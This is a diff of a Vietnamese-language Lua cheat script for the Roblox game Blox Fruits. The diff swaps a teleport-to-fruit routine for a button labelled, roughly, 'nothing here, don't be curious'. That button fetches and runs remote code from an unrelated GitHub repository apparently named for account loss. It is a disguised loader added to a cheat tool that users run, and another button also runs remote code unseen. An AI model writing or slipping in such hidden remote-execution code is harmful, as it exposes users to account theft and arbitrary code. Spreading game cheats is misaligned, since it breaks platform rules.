@@ -161,25 +161,12 @@ local Tab = Window:NewTab("Blox Fruit")
 local Section = Tab:NewSection("Hỗ trợ")
 
 Section:NewButton("click có hitbox", "bật rùi là ko dừng lại dc", function()
- loadstring(game:HttpGet('https://raw.githubusercontent.com/asdjasdhsuhduahd213/AN_HUB/main/click%20hitbot'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/asdjasdhsuhduahd213/AN_HUB/main/click%20hitbot'))()
 end)
 
-Section:NewButton("click tele Fruit spawn ", "Nguyễn An", function()
+Section:NewButton("ko có j đâu ( đừng tò mò ) ", "Nguyễn An", function()
     print("Clicked")
-for _,v in next, workspace:GetDescendants() do
-if v.Name == "Handle"  then 
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame 
-   
-
-end
-end
-for _,v in next, workspace:GetDescendants() do
-if  v.Name == "Fruit"  then
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
-   
-
-end
-end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Chetdithglon/lklklkl/main/bayacc'))()
 end)
 
 Section:NewToggle("chạy nhanh đến nổ máy", "....", function(state)
